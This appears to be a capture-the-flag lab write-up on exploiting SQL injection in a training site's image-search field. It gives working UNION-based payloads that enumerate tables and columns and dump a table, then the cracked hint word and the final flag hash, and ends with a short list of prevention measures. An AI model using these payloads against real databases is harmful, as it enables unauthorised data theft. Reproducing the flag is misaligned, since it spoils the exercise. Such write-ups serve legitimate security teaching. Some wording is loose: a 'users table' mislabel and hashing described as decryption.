## Where to Locate:

Following our experience with the member input field sql injection we now find another input field on the http://$IP/?page=searchimg page.

## Exploit:

So again we test if we can perform a sql injection by entering "0 or 1=1" into the input field and submit. Again we see it is possible

Knowing this we can begin by searching for the table name that the query searchs
We can do this by entering the command 
```1 and 1=2 union select 1,concat(table_name) from information_schema.tables where table_schema = database()```

This returns the table name=list_images

Following which we can search for the column names associated with the users table by entering the following command
```1 and 1=2 union select 1,concat(column_name) from information_schema.columns where table_schema = database()```

Which will return the following column names (id, url, title, comment)

We can now use all this information to obtain all the details of the users table and the contents of it's columns by entering the following command
```1 and 1=2 union select 1,concat(id, url, title, comment) from list_images```

The results from this command return a number of fields of which the following is of particular interest
"5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"

Following the instructions, we decrypt the md5 hash and obtain the word albatroz, we then perform a sh256 encrypt and obtain
the hash "f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188" which is our flag

## Prevention:

1. Input validation
2. Parametrized queries
3. Stored procedures
4. Escaping